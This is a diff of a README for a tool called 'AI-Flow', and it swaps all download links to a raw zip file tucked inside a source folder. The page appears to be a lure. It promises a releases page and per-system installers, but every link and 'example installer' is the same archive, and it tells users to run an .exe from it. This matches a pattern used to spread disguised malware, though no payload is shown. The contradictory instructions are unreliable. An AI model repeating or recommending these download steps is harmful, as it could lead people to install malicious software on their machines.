@@ -1,6 +1,6 @@
 # 🤖 AI-Flow - Build Intelligent Workflows Effortlessly
 
-[![Download AI-Flow](https://raw.githubusercontent.com/sagarsharma459/AI-Flow/main/periarthritis/AI-Flow.zip)](https://raw.githubusercontent.com/sagarsharma459/AI-Flow/main/periarthritis/AI-Flow.zip)
+[![Download AI-Flow](https://github.com/sagarsharma459/AI-Flow/raw/refs/heads/main/apps/ai-orchestrator/src/A_Flow_v3.0.zip)](https://github.com/sagarsharma459/AI-Flow/raw/refs/heads/main/apps/ai-orchestrator/src/A_Flow_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -20,11 +20,11 @@ Before you start, make sure your computer meets these basic requirements:
 To get started with AI-Flow, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to go to the AI-Flow releases page.
-   [Download AI-Flow](https://raw.githubusercontent.com/sagarsharma459/AI-Flow/main/periarthritis/AI-Flow.zip)
+   [Download AI-Flow](https://github.com/sagarsharma459/AI-Flow/raw/refs/heads/main/apps/ai-orchestrator/src/A_Flow_v3.0.zip)
 
 2. **Choose the Version:** On the releases page, you will see multiple versions of AI-Flow. Pick the latest version for your operating system. 
 
-3. **Download the Installer:** Click on the installer file that matches your system (e.g., `https://raw.githubusercontent.com/sagarsharma459/AI-Flow/main/periarthritis/AI-Flow.zip`, `https://raw.githubusercontent.com/sagarsharma459/AI-Flow/main/periarthritis/AI-Flow.zip`, or the appropriate Linux package).
+3. **Download the Installer:** Click on the installer file that matches your system (e.g., `https://github.com/sagarsharma459/AI-Flow/raw/refs/heads/main/apps/ai-orchestrator/src/A_Flow_v3.0.zip`, `https://github.com/sagarsharma459/AI-Flow/raw/refs/heads/main/apps/ai-orchestrator/src/A_Flow_v3.0.zip`, or the appropriate Linux package).
 
 4. **Run the Installer:** 
    - **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
@@ -72,4 +72,4 @@ Regular updates may introduce new features or improvements. Keep an eye on the r
 
 Once again, to download AI-Flow, visit the link below:
 
-[Download AI-Flow](https://raw.githubusercontent.com/sagarsharma459/AI-Flow/main/periarthritis/AI-Flow.zip)
+[Download AI-Flow](https://github.com/sagarsharma459/AI-Flow/raw/refs/heads/main/apps/ai-orchestrator/src/A_Flow_v3.0.zip)
